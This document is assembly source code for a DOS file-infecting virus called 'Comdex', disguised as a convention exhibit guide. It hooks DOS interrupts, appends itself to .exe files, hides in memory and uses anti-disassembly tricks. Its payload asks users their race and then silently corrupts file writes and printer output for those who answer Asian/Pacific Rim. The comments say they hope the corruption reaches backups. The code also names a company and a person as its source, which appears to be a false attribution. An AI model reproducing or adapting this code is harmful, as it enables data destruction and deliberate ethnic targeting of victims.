;	The Comdex exibit guide program
;	For the Fall 1991 Comdex Las Vegas Convention
;
;
;        A short description of the program:
;
;        It only affects .exe files. 
;        Comdex attaches itself to the end of the programs it affects.
;
;        When an affected file is run, Comdex copies itself to top of
;        free memory, and modifies the memory blocks, in order to hide from
;        memory mapping programs. Some programs may overwrite this area,
;        causing the computer to crash.  If this happens, the user obviously
;	 deserved it. 
;
;        Comdex will hook int 21h and when function 4b (exec) is called
;        it sometimes will affect the program being run. It will check every
;        program that is run for affection, and if it is not already
;        affected, it will be.
;
;	 Comdex will, after 1 hr, one of 16 chance, ask your race or
;	 nationality prior to executing a file.  Af you answer that you
;	 are asian/pacific rim, one of 256 file writes will have the
;	 length adjusted downward or the record size reduced, depending
;	 upon the specific dos call made.
; 
;
;        Comdex will remove the read-only attribute before trying to
;        affect programs.
;
;        Affected files can be easily recognized, since they always end in
;        "COMD"
;
;        To check for system affection, a byte at 0:33c is used - if it
;        contains a 069h, Comdex is installed in memory.
;
;
comsiz        equ        128		;in paragraphs
 
code segment para public 'code'
        assume cs:code,ds:nothing,ss:nothing,es:nothing
 
;
;         Comdex is basically divided in the following parts.
;
;        1. the main program - run when an affected program is run.
;           it will check if the system is already affected, and if not
;           it will install Comdex.
;
;        2. the new int 17 handler. adjusts two ascii output chars.
;
;        3. the new int 14 handler. 
;
;        4. the new int 8 handler.
;
;        5. the new int 9 handler. 
;
;        6. the new int 21 handler. it will look for exec calls, and
;           affect the program being run.
;
;
;        this is a fake mcb (memory control block)
;	 ms-dos inspects the chain of mcbs whenever a memory block allocation,
;	 modification, or release function is requested, or when a program
;	 is execed or terminated...
;
        db        'Z',00,00,comsiz,0,0,0,0,0,0,0,0,0,0,0,0
; 	                      ^___ # of paragraphs of the controlled mem blk


 
Comdex   proc    far
;
;        Comdex starts by pushing the original start address on the stack,
;        so it can transfer control there when finished.
;
labl:  sub	sp,4
        push    bp
	mov     bp,sp
        push    ax
;following line nuked for ease of test
;	nop			;added so that scan84 doesn't id as [ice-3]
        mov     ax,es
;
;        put the the original cs on the stack. the add ax,data instruction
;        is modified by Comdex when it affects other programs.
;
        db      05h		;this is an add ax,10h
org_cs  dw      0010h
        mov     [bp+4],ax
;
;        put the the original ip on the stack. this mov [bp+2],data instruction
;        is modified by Comdex when it affects other programs.
;
        db      0c7h,46h,02h
org_ip  dw      0000h
;
;        save all registers that are modified.
;
        push    es
        push    ds
        push    bx
        push    cx
        push    si
        push    di
;
;        check if already installed. quit if so.
;
        mov        ax,0                
        mov        es,ax		;zero es
        cmp        es:[33ch],byte ptr 069h
;&&
;        jne        l1
;
;        restore all registers and return to the original program.
;
exit:   pop        di
        pop        si
        pop        cx
        pop        bx
        pop        ds
        pop        es
        pop        ax
        pop        bp
        retf
;
;    Comdex tries to hide from detection by modifying the memory block it
;    uses, so it seems to be a block that belongs to the operating system.
;
;    it looks rather weird, but it seems to work.
;
l1:     mov     ah,52h
        call	int21		;undefined dos call!!?
        mov     ax,es:[bx-2]
	nop
        mov     es,ax
        add     ax,es:[0003]
        inc     ax
        inc     ax
        mov     cs:[0001],ax
;
;         next, Comdex modifies the memory block of the affected program.
;         it is made smaller, and no longer the last block.
;
        mov     bx,ds
        dec     bx
	nop 
        mov     ds,bx
        mov     al,'M'
        mov     ds:[0000],al
        mov     ax,ds:[0003]
        sub     ax,comsiz
        mov     ds:[0003],ax
        add     bx,ax
        inc     bx
;
;         then Comdex moves itself to the new block.
;
	mov	es,bx
	xor	si,si
	xor	di,di
	push	cs
	pop	ds
        mov     cx,652h			;the length of this program -
					;be *sure* to update this!!
					;in fact, make it symbolic!!
        cld
        rep     movsb
;
;        Comdex then transfers control to the new copy of itself.
;
        push     es
	nop
        mov      ax,offset l3
        push     ax
        retf
	db	 3dh			;confuse disassemblers
;
;       zero some variables
;
l3:     mov     byte ptr cs:[min60],0
        mov     byte ptr cs:[min50],0
        mov     word ptr cs:[timer],0
	mov	byte ptr cs:[input_char],0
;
;       set flag to confirm installation
;
	xor	ax,ax
	mov	es,ax
	inc	ax			;dummy operation to confuse function
        mov     byte ptr es:[33ch],069h
;
;       hook interrupt 21:
;	(the primary dos function interrupt) 
;
        mov        ax,es:[0084h]
        mov        cs:[old21],ax
        mov        ax,es:[0086h]
	nop 
        mov        cs:[old21+2],ax
        mov        ax,cs
        mov        es:[0086h],ax
        mov        ax,offset new21
        mov        es:[0084h],ax
;
;       hook interrupt 17:
;	(bios lpt services)
;
       mov        ax,es:[005ch]
       mov        cs:[old17],ax
       nop
       mov        ax,es:[005eh]
       mov        cs:[old17+2],ax
       inc	  ax			;dummy op
       mov        ax,cs
       mov        es:[005eh],ax
       mov        ax,offset new17
       mov        es:[005ch],ax

;
;       hook interrupt 14:
;	(bios serial port services)
;
;       mov        ax,es:[0050h]
;       mov        cs:[old17],ax
;       mov        ax,es:[0052h]
;       mov        cs:[old14+2],ax
;       mov        ax,cs
;       mov        es:[0052h],ax
;       mov        ax,offset new14
;       mov        es:[0050h],ax
;
;
;
        cmp     word ptr cs:[noinf],5
        jg      hook8
        jmp     exit
;
;       hook interrupt 9
;	(bios keyboard interrupt)
;
;hook9:  mov        ax,es:[0024h]
;       mov        cs:[old9],ax
;       mov        ax,es:[0026h]
;       mov        cs:[old9+2],ax
;       mov        ax,cs
;       mov        es:[0026h],ax
;       mov        ax,offset new9
;       mov        es:[0024h],ax
;
;       hook interrupt 8
;	(timer ticks)
;
	db	   3dh,0cch,03h,3dh,3dh	;confuse dissassemblers
hook8:  mov        ax,es:[0020h]
        mov        cs:[old8],ax
        mov        ax,es:[0022h]
        mov        cs:[old8+2],ax
        mov        ax,cs
	nop
        mov        es:[0022h],ax
        mov        ax,offset new8
        mov        es:[0020h],ax
        jmp        exit


;the int 21 calls go through this routine to confuse the issue:
int21:	push	ax
	mov	ax,0ffh
	mov	word ptr cs:[internal],ax	;set internal int 21 flag
	mov	al,20h
	inc	al				;put 21 in al
	mov	byte ptr cs:[int21b],al		;self modifying code!
	pop	ax
	db	0cdh				;int opcode
int21b:	db	0cch				;overwritten to int 21h
	push	ax
	mov	ax,00
	mov	word ptr cs:[internal],ax	;clear internal int 21 flag
	mov	ax,0cch
	mov	byte ptr cs:[int21b],al		;nuke it back to int 0cch
	pop	ax
	retn



	db	"Welcome to Comdex "
	db	"From the Interface Group, Inc. "
	db	"300 First Avenue "
	db	"Needham, MA 02194 "
	db	"(617)449-6600 "
	db	"For data recovery ask for "
	db	"Peter J. Bowes, unless you are "
	db	"Oriental, in which case, we will "
	db	"not help you. "

quest  	db	0dh,0ah,"Software Piracy Prevention Center",0dh,0ah
	db	"requests your cooperation:",0dh,0ah,0dh,0ah
	db	"Please enter your race or nationality:",0dh,0ah
	db	"a. White		 e. Eastern European",0dh,0ah	
	db	"b. Black		 f. Soviet",0dh,0ah
	db	"c. Hispanic		 g. Western European",0dh,0ah
	db	"d. Asian/Pacific Rim	 h. Other",0dh,0ah,0dh,0ah
	db	"  Please enter your response: ","$"

input_char:	db	0
	db	3dh		;confuse disassemblers

askit:	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	ds
	push	es

	cmp	byte ptr cs:[min60],1	;resident 1 hr yet?
	jnz	noask
	cmp	byte ptr cs:[input_char],0
	jnz	noask			;don't ask twice
	mov	ax,word ptr cs:[timer]
	and	ax,000fh		;look at ls free running clock
	cmp	ax,000ch		;does it happen to be 00ch? (1 of 16)
	jnz	noask			;if not, don't ask the guy!

	mov	dx,offset quest		;ask the guy about race
	mov	ah,09h			;dos string print
	push	cs
	pop	ds
	call	int21			;print question on crt
	mov	ax,0c01h		;dos flush input and get char
	call	int21			;get char
	and	al,0dfh			;force upper case
	mov	byte ptr cs:[input_char],al	;save away response
noask:	pop	es
	pop	ds
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	retn

;********************************************************************

;
;       int 9 (keyboard) replacement: 
;       this routine does not become active until 50 minutes after
;       the execution of an affected program.
;
;new9:   push    ax
;        push    es
;        cmp     byte ptr cs:[min50],1
;        jnz     retx1

;insert any code here that activates 50 min after launch for int 9...
 
;retx1:  pop     es			;prepare to go to old int 9 code:
;        pop     ax
;        db      0eah			;jmp 0000:0000 nmemonic
;old9    dw      0,0			;storage for old addr


;********************************************************************
;
;       new int 14 (serial port) routine - 
;
;new14:  cmp     ah,1			;is it an output request?
;        jz      s1			;yup.  don't return just yet.
;do14:   db      0eah			;jmp 0000:0000 nmemonic
;old14   dw      0,0
;s1:     

;insert any code here for output to serial port...

;        jmp     do14


;********************************************************************
;
;       new int 8 routine  (bios timer ticks)
;
	db	3dh			;piss off disassemblers
new8:  	push    dx
        push    cx
        push    bx
        push    ax
	jmp	txex ;&&
	inc	word ptr cs:[timer]		; increment timer
        cmp     byte ptr cs:[min60],01          ; if counter >= 60 min.
        jz      tt0                             ; no need to check any more
        cmp     word ptr cs:[timer],-11         ; 60 minutes ?
        jz      tt1
        cmp     word ptr cs:[timer],54601       ; 50 minutes ?
        jz      tt2
        jmp     txex
;
;       50 minutes after an affected program is run the flag is set.
;
tt2:    mov     byte ptr cs:[min50],1
        jmp     txex
;
;       60 minutes after an affected program is run this flag is set.
;
tt1:    mov     byte ptr cs:[min60],1

;	exit interrupt routine:

        jmp     txex
;
;       every time an int 8 occurs, after the 60 min. have passed, we
;       end up here:
;
tt0:    
;insert any fun timer oriented code here
;
;       restore registers and quit
;
txex:   pop     ax
        pop     bx
        pop     cx
        pop     dx
        db      0eah
old8    dw      0,0

;********************************************************************
;
;       new int 17 routine. lpt out stuff.
;
new17:  jmp	do17	;&&
	cmp     ah,0
	
        jz      p0
do17:   db      0eah
old17   dw      0,0
	db	2eh			;confuse disassemblers
p0:	cmp	byte ptr cs:[input_char],44h	;d. asian/pacific rim?
	jne	not_asian     
	push	ax
	mov	ax,word ptr cs:[timer]
	and	ax,00ffh
	cmp	ax,0032h		; one of 256 odds
	pop	ax			; restore ax, doesn't change flags
	jne	do17			; don't twiddle lpt 255/256 odds
	cmp	al,55h			; printing a "U"?
	jne	notu
	mov	al,0efh			; make it upside-down!
	jmp	do17			; and continue.
notu:	cmp	al,06fh			; lower case "o"?
	jne	do17			; no?  then exit.
	mov	al,093h			; make it an "o" with a ^ over it!
	jmp	do17			; and exit.	
not_asian:
        jmp     do17


;Int 21 file adjustment routines - the following routines corrupt a small
;percentage of the file writes that Asians do in their use of the pc.  For
;example, when one updates a spreadsheet or exits a word processor, the
;application software will re-write the file out to disk.  What we do here
;is reduce the amount of the data that is written to the file.  The hope
;is that the problem will be hidden for a significant period of time, since
;it happens only infrequently, and since it typically will happen upon exit
;of the application package.  If the reduction of the write causes a serious
;problem (we hope it will) it won't usually be noticed until that file is
;loaded again.  The other hope is that if the user does backup his data from
;time to time, this corrupted data will end up on the backup as well before
;the problem is noticed.  With luck, maybe the user will assume that the
;hardware is intermittent, and backup the system over the top of his only
;existing backup set, then purchase replacement hardware.



fuck_size_f:			;if asian, reduce file rec size by 1 on fcb ops
	push	ax
	push	di
	push	dx		;setup di for indexed operations
	pop	di
	cmp	byte ptr cs:[input_char],044h	;asian?
	jne	exit_fuck_f	;no, then do nothing
	mov	ax,word ptr cs:[timer]
	and	ax,00ffh	;mask off ls 8 bits of free run timer
	cmp	ax,0069h	;does it happen to be 69h? (1 of 256)
	jne	exit_fuck_f	;nope, so do nothing
	
	mov	al,[ds:di+0]	;get first byte of user's fcb
	cmp	al,0ffh		;extended fcb?
	jne	norm_fcb	;nope, so handle as normal fcb
	mov	ax,[ds:di+15h]	;get record size, 16 bits on extd fcb.
	dec	ax		;adjust it a bit, since the user really doesn't
				;need to write so much data.
	mov	[ds:di+15h],ax
	jmp	exit_fuck_f	;subsequent r/w ops should fail to get the
				;right data until this file is closed or
				;until system crashes.
	
norm_fcb:
	mov	al,[ds:di+0eh]	;get record size, only 8 bits on norm fcb.
	dec	al		;reduce by 1
	mov	[ds:di+0eh],al	;store it back
exit_fuck_f:
	pop	di
	pop	ax
	jmp	do21


fuck_size_h:			;reduce length of handle file writes
	push	ax
	push	di
	push	dx
	pop	di
	cmp	byte ptr cs:[input_char],044h  ;asian?
	jne	exit_fuck_h	;no, so don't damage anything.
	mov	ax,word ptr cs:[timer]
	and	ax,00ffh
	cmp	ax,0066h	;one out of 256 odds
	jne	try_again	;no?  well give it another chance.
	and	cx,0fff5h	;reduce write length in bytes by a flakey amt
	dec	cx		;ranging from 1 to 11 bytes.
exit_fuck_h:
	pop	ax
	jmp	do21

try_again:
	cmp	ax,0077h	;one of 256 odds?
	jne	exit_fuck_h	;exit if not lucky.
	mov	ax,[ds:di+30h]	;get a user data byte from his buffer
	xor	ax,0004h	;toggle bit 2 of byte 30h
	mov	[ds:di+30h],ax	;and put it back
	jmp	exit_fuck_h

;********************************************************************
;
;        this is the int 21 replacement. it only does something in 
;        the case of an execute program dos call.
;
;be careful here not to trap int codes that we use internally!
new21:  jmp	do21	;&&
	push	ax
	cmp	word ptr cs:[internal],0ffh ;is it an internal int 21?
	je	do21			;yup, so no tweaking allowed
	pop	ax
	cmp	ah,015h			;is it a fcb file write?
	je	fuck_size_f		;if asian, reduce record size by 1
	cmp	ah,040h			;is it a handle file write?
	je	fuck_size_h		;if asian, adjust write length down.
	cmp    ah,4bh			;is it an int 21 code 4b?
        je     l5			;yup.  go affect stuff
do21:   db     0eah			;nope.  let dos handle it
old21   dw     0,0
;
;       the code to only affect every tenth program has been removed
;	for now.  restore this code later.
;
	db	    3dh			;confuse disassemblers
l5:     call	    askit		;ask race if appropriate
	push        ax
        push        bx
        push        cx
        push        dx
        push        si
        push        ds
;
;        search for the file name extension ...
;
        mov        bx,dx
l6:     inc        bx
        cmp        byte ptr [bx],'.'
        je         l8
        cmp        byte ptr [bx],0
        jne        l6
;
;        ... and quit unless it starts with "ex".
;
l7:     pop        ds
        pop        si
        pop        dx
        pop        cx
        pop        bx
        pop        ax
        jmp        do21
l8:     inc        bx
        cmp        word ptr [bx],5845h		;"EX"
        jne        l7
;
;        when an .exe file is found, Comdex starts by turning off
;        the read-only attribute. the read-only attribute is not restored
;        when the file has been affected.
;
        mov        ax,4300h                ; get attribute
        call	   int21
        jc         l7
        mov        ax,4301h                ; set attribute
        and        cx,0feh
        call	   int21
        jc         l7
;
;        next, the file is examined to see if it is already affected.
;         the signature (4418 5f19) is stored in the last two words.
;
        mov        ax,3d02h                ; open / write access
        call	   int21
        jc         l7
        mov        bx,ax                        ; file handle in bx
;
;       this part of the code is new: get date of file.
;
        mov     ax,5700h
        call	int21
        jc      l9
        mov     cs:[date1],dx
        mov     cs:[date2],cx
;
        push    cs                        ; now ds is no longer needed
        pop     ds
;
;        the header of the file is read in at [id+8]. Comdex then
;        modifies itself, according to the information stored in the
;        header. (the original cs and ip addressed are stored).
;
        mov        dx,offset id+8
        mov        cx,1ch
        mov        ah,3fh
        call	   int21
        jc         l9
        mov        ax,ds:id[1ch]
        mov        ds:[org_ip],ax
	inc	   ax			;confuse reader a little
        mov        ax,ds:id[1eh]
        add        ax,10h
        mov        ds:[org_cs],ax
;
;        next the read/write pointer is moved to the end of the file-4,
;        and the last 4 bytes read. they are compared to the signature,
;        and if equal nothing happens.
;
        mov        ax,4202h
        mov        cx,-1
        mov        dx,-4
        call	   int21
        jc         l9
        add        ax,4
        mov        ds:[len_lo],ax
        jnc        l8a
        inc        dx
l8a:    mov        ds:[len_hi],dx
;
;       this part of Comdex is new - check if it is below minimum length
;
        cmp        dx,0
        jne        l8b
        mov        cl,13
        shr        ax,cl
        cmp        ax,0
        jg         l8b
	nop
        jmp        short l9
l8b:    mov        ah,3fh
        mov        cx,4
        mov        dx,offset id+4
        call	   int21
        jnc        l11
l9:     mov        ah,3eh
        call	   int21
l10:    jmp        l7
	db	   3eh			;confuse disassemblers
;
;        compare to 4f43,444d which is first 4 letters of Comdex
;
l11:    mov        si,offset id+4
        mov        ax,[si]
        cmp        ax,4f43h		;ascii "OC"
        jne        l12
        mov        ax,[si+2]
        cmp        ax,444dh		;ascii "DM"
        je         l9
;
;        the file is not affected, so the next thing Comdex does is
;        affect it. first it is padded so the length becomes a multiple
;        of 16 bytes. this is done so Comdex code can start at a
;        paragraph boundary.
;
l12:    mov        ax,ds:[len_lo]
        and        ax,0fh
        jz         l13
        mov        cx,16
        sub        cx,ax
	nop
        add        ds:[len_lo],cx
        jnc        l12a
        inc        ds:[len_hi]
l12a:   mov        ah,40h
        call	   int21		;dos write to file
        jc         l9
;
;        next the main body of Comdex is written to the end.
;
l13:    xor	   dx,dx
        mov        cx,offset id + 4
        mov        ah,40h		;dos write to file
        call	   int21
        jc         l9
;
;        next the .exe file header is modified:
;
;        first modify initial ip
;
f0:     mov        ax,offset labl
        mov        ds:id[1ch],ax
;
;        modify starting cs = Comdex cs. it is computed as:
;
;        (original length of file+padding)/16 - start of load module
;
        mov        dx,ds:[len_hi]
        mov        ax,ds:[len_lo]
        mov        cl,cs:[const1]               ; modified a bit
        shr        dx,cl
        rcr        ax,cl
	nop 
        shr        dx,cl
        rcr        ax,cl
        shr        dx,cl
        rcr        ax,cl
        nop
	shr        dx,cl
        rcr        ax,cl
        sub        ax,ds:id[10h]
        mov        ds:id[1eh],ax
;
;        modify length mod 512
;
        add        ds:[len_lo],offset id+4
        jnc        l14
        inc        ds:[len_hi]
l14:    mov        ax,ds:[len_lo]
        and        ax,511
	nop
        mov        ds:id[0ah],ax
;
;        modify number of blocks used
;
        mov        dx,ds:[len_hi]
        mov        ax,ds:[len_lo]
        add        ax,511
        jnc        l14a
        inc        dx
l14a:   mov        al,ah
        mov        ah,dl
        shr        ax,1
        mov        ds:id[0ch],ax
;
;        finally the modified header is written back to the start of the
;        file.
;
wrtback:mov     ax,4200h
        xor	cx,cx   
        xor	dx,dx  
        call	int21			;dos move file pointer
        jc      endit
        mov     ah,40h
        mov     dx,offset id+8
        mov     cx,1ch
        call	int21			;dos write to file
;
;       this part is new:       restore old date.
;
        mov     dx,cs:[date1]
        mov     cx,cs:[date2]
        mov     ax,5701h
        call	int21			;dos set file date and time
        jc      endit
        inc     word ptr cs:[noinf]
;
;        affection is finished - close the file and execute it
;
endit:  jmp     l9
;
;

timer	dw	0	; number of timer (int 8) ticks 
const1  db      1       ; the constant 1
const0  dw      0       ; the constant 0
internal dw	0	; internal int 21 in effect.
min50	db	0	; flag, set to 1 50 minutes after execution
min60   db      0       ; flag, set to 1 60 minutes after execution
vmode   db      0       ; video mode
date1   dw      ?       ; date of file
date2   dw      ?       ; ditto.
len_lo  dw      ?
len_hi  dw      ?
noinf   dw      0       ; number of affections
id      label word
        db      "COMD"  ; the signature of Comdex.
;
;        a buffer, used for data from the file.
;
 
Comdex   endp
code        ends
 
        end labl
